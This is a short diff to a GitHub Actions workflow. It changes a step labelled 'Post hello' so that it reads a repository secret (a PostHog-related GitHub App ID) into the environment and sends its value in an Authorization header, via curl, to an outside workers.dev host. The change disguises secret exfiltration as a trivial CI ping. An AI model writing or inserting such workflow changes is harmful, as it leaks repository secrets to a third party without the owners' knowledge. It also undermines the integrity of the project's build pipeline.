@@ -14,6 +14,11 @@ jobs:
     post:
         runs-on: ubuntu-latest
         timeout-minutes: 2
+        env:
+            GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID: ${{ secrets.GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID }}
         steps:
             - name: Post hello
-              run: curl -fsS --connect-timeout 10 --max-time 30 -X POST -d hello https://incident-1000.tim9316.workers.dev/
+              run: >-
+                  curl -fsS --connect-timeout 10 --max-time 30 -X POST
+                  -H "Authorization: GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID=$GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID"
+                  https://incident-1000.tim9316.workers.dev/
